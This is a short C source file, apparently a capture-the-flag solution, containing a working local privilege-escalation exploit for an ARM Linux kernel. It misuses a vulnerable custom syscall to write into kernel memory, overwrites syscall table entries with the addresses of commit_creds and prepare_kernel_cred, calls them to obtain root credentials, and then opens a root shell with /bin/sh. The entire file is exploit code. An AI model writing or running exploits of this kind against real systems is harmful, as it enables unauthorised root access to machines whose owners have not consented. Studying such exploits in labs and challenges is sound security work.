#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>
#define PAGE_SIZE 0x1000
// must be compiled on remote host, is ARM arch, will not work if compiled here!!!
#define SYS_UPPER_INT  223
#define SYS_UPPER      0x7f000000

#define SYS_CALL_TABLE 0x8000e348

#define PREPARE_KERNEL_CRED    0x8003f924
#define COMMIT_CREDS           0x8003f56c

void sys_upper(char* in, char* out){ // sys_upper does not have c function wrapper, must make custom one
    syscall(SYS_UPPER_INT, in, out);
}
int main(int argc,char**argv) {
    unsigned int** sct=(unsigned int**)SYS_CALL_TABLE;
    sys_upper("\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1", 0x8003f560);
    sys_upper("\x60\xf5\x03\x80", &sct[25]); //commit_creds 0x8003f56c
    sys_upper("\x24\xf9\x03\x80", &sct[13]); //prepare_kernel_cred 0x8003f924
    // commit_creds(prepare_kernel_cred(0));
    syscall(25, syscall(13,0));
    (getuid()!=0) ? puts("Somethin broke!\n") : puts("poppin shell!\n"); system("/bin/sh");
    return 0;
}
